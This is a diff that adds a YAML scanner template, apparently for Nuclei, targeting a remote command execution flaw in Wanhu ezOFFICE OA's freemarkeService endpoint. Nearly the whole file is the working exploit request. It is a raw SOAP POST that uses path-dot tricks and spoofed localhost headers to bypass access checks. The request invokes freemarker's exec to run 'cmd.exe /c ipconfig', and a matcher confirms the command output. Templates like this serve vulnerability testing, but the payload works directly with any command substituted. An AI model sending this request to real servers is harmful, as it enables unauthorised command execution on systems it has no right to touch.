@@ -1,0 +1,58 @@
+id: wanhu-ezoffice-freemarkeService-rce
+info:
+  name: 万户OA freemarkeService 远程命令执行
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59151/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: rce,wanhu,ezoffice
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/services/./././freemarkeService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.1739.87 Safari/537.36
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        X-Originating: 127.0.0.1
+        X-Forwarded-For: 127.0.0.1
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: [计算的内容长度]
+        Connection: close
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+          xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+          xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+          xmlns:util="http://utility.template.freemarker"
+          xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
+          <soapenv:Header/>
+          <soapenv:Body>
+            <util:exec soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+              <arguments xsi:type="xst:ArrayOf_xsd_anyType" soapenc:arrayType="xsd:anyType[]">
+                <cmd xsi:type="soapenc:string">c:\windows\system32\cmd.exe /c ipconfig</cmd>
+              </arguments>
+            </util:exec>
+          </soapenv:Body>
+        </soapenv:Envelope>
+        
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "Windows IP"
+
+      - type: status
+        status:
+          - 200
